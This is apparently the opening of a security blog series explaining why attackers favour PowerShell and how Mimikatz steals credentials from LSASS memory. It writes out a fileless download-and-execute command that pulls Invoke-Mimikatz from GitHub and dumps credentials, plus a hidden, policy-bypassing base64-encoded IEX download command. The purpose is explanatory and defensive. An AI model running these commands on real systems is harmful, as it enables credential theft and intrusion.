
# Malicious Powershell 
In this series, I'll discuss why organizations should care about malicious Powershell activity, how the attackers use Powershell to steal credential(e.g.,Mimikatz) and how to prevent and detect malicious Powershell activity.

## Why do attackers love Powershell ?
PowerShell, a powerful Windows scripting language, is used by IT professionals and adversaries alike. Attackers favor PowerShell for several reasons:

- It's build-in command line tool.
- It can download and execute code from another system.
- It provides unprecedented access on Windows computers
- It’s enabled on most computers, as system administrators use PowerShell to automate various tasks (e.g,. shut down your machines automatically at 12 a.m.—do this via task scheduler)
- Its malicious use is often not stopped or detected by traditional endpoint defenses, as files and commands are not written to disk. This means fewer artifacts to recover for forensic analysis.

Several offensive tools exist that are built on or use PowerShell, including the following:
- [Empire](https://github.com/EmpireProject/Empire)
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Metasploit](https://www.rapid7.com/db/modules/post/windows/manage/exec_powershell/)
- [Invoke-Mimikatz](https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz)

Eliminating Powershell isn't ideal due to the benifits it offers IT administrators. Instead, we need to learn how to secure Powershell.

Let's take a deep dive into Powershell usage to dump password with Mimikatz.

## What is Mimikatz, and how does it work?
Mimikatz is a post-exploitation tool used to dump passwords, hashes, and Kerberos tickets from memory. Attackers use Mimikatz to steal credentials and escalate their privileges; similarly, pen testers use Mimikatz to retrieve plaintext versions of passwords from hashes stored in memory (these exist to provide Windows single sign-on (SSO) functionality). It enables many attacks that use credentials such as pass the hash, pass the ticket, golden Kerberos ticket, and so on. 

In order to facilitate SSO, whenever a user authenticates, a variety of credentials are generated and stored in LSASS memory. The credentials stored in LSASS memory can be NTLM password hashes, Kerberos tickets, and even clear-text passwords when using the Windows feature WDigest. WDigest, introduced with Windows XP, is an authentication protocol used for LDAP and web-based authentication. Client machines that seek to authenticate must demonstrate their knowledge of secret keys. This improves on earlier versions of HTTP authentication where the user provides a password that is not encrypted when sent to authenticating server. As WDigest stores cleartext passwords in memory, if an attacker has control over that endpoint, they can run Mimikatz to steal hashes and clear text passwords.

Mimikatz was most famously used in the Petya and NotPetya attacks that affected thousands of computers worldwide between 2016 and 2017. The NotPetya virus, similar to Petya, infects a target computer, encrypts the data on the computers and displays a message for the victim explaining how to send bitcoin in order to retrieve the encrypted data.

Let's look at a malicious PowerShell command for fileless network access and remote content execution. This command passes the contents of the file hosted on the below URL to PowerShell via the commandline, and executes it "in memory" on the target system:

    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
    
where:
- IEX or Invoke-Expression cmdlet: executes the command provided on the local machine.
- New-Object cmdlet: creates an instance of a .NET Framework
- downloadstring: download the contents from Github into a memory buffer, which IEX will execute
- DumpCreds parameter: instructs Mimikatz to dump credentials out of LSASS.  


---

      powershell.exe -Noprofile -NonI -W Hidden -Exec Bypass -encodedcommand  SUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cHM6Ly93d3cuZmlyZWV5ZS5jb20vY29tcGFueS9qb2JzLmh0bWwnKSk=

The following is a quick explanation of the arguments:
- -NoProfile – indicates that the current user’s profile setup script should not be executed when the PowerShell engine starts.
- -NonI – shorthand for -NonInteractive, meaning an interactive prompt to the user will not be presented.
- -W Hidden – shorthand for “-WindowStyle Hidden”, which indicates that the PowerShell session window should be started in a hidden manner.
- -Exec Bypass – shorthand for “-ExecutionPolicy Bypass”, which disables the execution policy for the current PowerShell session (default disallows execution). It should be noted that the Execution Policy isn’t meant to be a security boundary.
- -encodedcommand – indicates the following chunk of text is a base64 encoded command.

--- 
Check version of powershell 
        
        $PSVersionTable

| Name                           | Value                      |
|:------------------------------:|:--------------------------:|                         
| PSVersion                      | 5.1.19041.1682             |
| PSEdition                      | Desktop                    |
| PSCompatibleVersions           | {1.0, 2.0, 3.0, 4.0...}    |
| BuildVersion                   | 10.0.19041.1682            |
| CLRVersion                     | 4.0.30319.42000            |
| WSManStackVersion              | 3.0                        |
| PSRemotingProtocolVersion      |2.3                         |
| SerializationVersion           | 1.1.0.1                    |  
